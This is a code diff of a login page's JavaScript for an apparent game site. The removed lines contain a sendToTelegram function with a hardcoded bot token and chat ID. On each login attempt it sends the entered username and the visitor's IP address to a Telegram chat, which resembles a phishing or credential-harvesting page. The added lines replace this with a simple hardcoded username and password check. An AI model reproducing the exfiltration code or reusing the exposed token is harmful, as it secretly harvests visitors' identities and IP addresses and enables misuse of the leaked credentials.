@@ -287,118 +287,91 @@
     </div>
 
     <script>
-    let toastVisible = false;
-    let toastTimeout;
-    const toast = document.getElementById('toast');
-    const progress = document.querySelector('.progress');
-    const closeButton = document.querySelector('.close');
-    const loginButton = document.getElementById('loginButton');
-    const toastTitle = document.getElementById('toastTitle');
-    const toastSubtitle = document.getElementById('toastSubtitle');
-    const toastIcon = document.getElementById('toastIcon');
-    const orangeBar = document.getElementById('orangeBar');
+        let toastVisible = false;
+        let toastTimeout;
+        const toast = document.getElementById('toast');
+        const progress = document.querySelector('.progress');
+        const closeButton = document.querySelector('.close');
+        const loginButton = document.getElementById('loginButton');
+        const toastTitle = document.getElementById('toastTitle');
+        const toastSubtitle = document.getElementById('toastSubtitle');
+        const toastIcon = document.getElementById('toastIcon');
+        const orangeBar = document.getElementById('orangeBar');
 
-    closeButton.addEventListener('click', closeToast);
+        closeButton.addEventListener('click', closeToast);
 
-    async function sendToTelegram(message) {
-        const token = '7751523850:AAGrsjxOfP8Q76ZpKss20eAG55rXxE6BMLg';
-        const chatId = '7618874046';
+        async function validateForm(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-    }
+            if (toastVisible) return;
 
-    async function validateForm(event) {
-        event.preventDefault();
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        const userIp = await getUserIp(); // Получаем IP адрес пользователя
-
-        // Записываем IP адрес, даже если пользователь не зарегистрирован
-        await sendToTelegram(`<b>Новая попытка входа:</b>\nUsername: @${username}\nIP: ${userIp}`);
-
-        // Проверяем, зарегистрирован ли пользователь
-        if (isUserRegistered(username)) {
-            // Здесь вызываем функцию для успешной авторизации
-            showSuccessToast("You have successfully logged in");
-            orangeBar.style.transform = "translateX(0)";
-            setTimeout(() => {
-                window.location.href = "https://wowgams.web/main/register.html";
-            }, 3000);
-        } else {
-            // Если пользователь не зарегистрирован
-            showToast();
+            if ((username === "user" && password === "password")) {
+                showSuccessToast("You have successfully logged in");
+                orangeBar.style.transform = "translateX(0)";
+                setTimeout(() => {
+                    window.location.href = "https://wowgams.web/main/register.html";
+                }, 3000);
+            } else {
+                showToast();
+            }
         }
-    }
 
-    async function getUserIp() {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    }
+        function showToast() {
+            if (toastVisible) return;
+            toast.classList.remove('success');
+            toast.classList.add('active');
+            progress.classList.add('active');
+            toastVisible = true;
+            loginButton.disabled = true;
+            toastTimeout = setTimeout(closeToast, 5000);
+        }
 
-    function isUserRegistered(username) {
-        // Замените логику проверки пользователя на вашу
-        const registeredUsers = ["admin", "shadomvd"]; // Пример зарегистрированных пользователей
-        return registeredUsers.includes(username);
-    }
+        function showSuccessToast(subtitle) {
+            if (toastVisible) return;
+            toast.classList.add('success');
+            toast.classList.add('active');
+            progress.classList.add('active');
+            toastTitle.textContent = "Successfully";
+            toastSubtitle.textContent = subtitle;
+            toastIcon.classList.remove('fa-exclamation-triangle');
+            toastIcon.classList.add('fa-check');
+            toastVisible = true;
+            loginButton.disabled = true;
+            toastTimeout = setTimeout(closeToast, 5000);
+        }
 
-    function showToast() {
-        if (toastVisible) return;
-        toast.classList.remove('success');
-        toast.classList.add('active');
-        progress.classList.add('active');
-        toastVisible = true;
-        loginButton.disabled = true;
-        toastTimeout = setTimeout(closeToast, 5000);
-    }
+        function closeToast() {
+            toast.classList.remove('active');
+            toast.classList.remove('success');
+            progress.classList.remove('active');
+            toastVisible = false;
+            loginButton.disabled = false;
+            toastTitle.textContent = "Error";
+            toastSubtitle.textContent = "You entered incorrect information";
+            toastIcon.classList.add('fa-exclamation-triangle');
+            toastIcon.classList.remove('fa-check');
+            clearTimeout(toastTimeout);
+        }
 
-    function showSuccessToast(subtitle) {
-        if (toastVisible) return;
-        toast.classList.add('success');
-        toast.classList.add('active');
-        progress.classList.add('active');
-        toastTitle.textContent = "Successfully";
-        toastSubtitle.textContent = subtitle;
-        toastIcon.classList.remove('fa-exclamation-triangle');
-        toastIcon.classList.add('fa-check');
-        toastVisible = true;
-        loginButton.disabled = true;
-        toastTimeout = setTimeout(closeToast, 5000);
-    }
+        function updateButtonState() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const isFilled = username && password;
+            loginButton.disabled = !isFilled;
+            if (isFilled) {
+                loginButton.classList.add('active');
+                loginButton.classList.remove('inactive');
+            } else {
+                loginButton.classList.remove('active');
+                loginButton.classList.add('inactive');
+            }
+        }
 
-    function closeToast() {
-        toast.classList.remove('active');
-        toast.classList.remove('success');
-        progress.classList.remove('active');
-        toastVisible = false;
-        loginButton.disabled = false;
-        toastTitle.textContent = "Error";
-        toastSubtitle.textContent = "You entered incorrect information";
-        toastIcon.classList.add('fa-exclamation-triangle');
-        toastIcon.classList.remove('fa-check');
-        clearTimeout(toastTimeout);
-    }
-
-    function updateButtonState() {
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        const isFilled = username && password;
-        loginButton.disabled = !isFilled;
-    }
-
-    document.getElementById('username').addEventListener('input', updateButtonState);
-    document.getElementById('password').addEventListener('input', updateButtonState);
-    updateButtonState();
-</script>
+        document.getElementById('username').addEventListener('input', updateButtonState);
+        document.getElementById('password').addEventListener('input', updateButtonState);
+        updateButtonState();
+    </script>
 </body>
 </html>
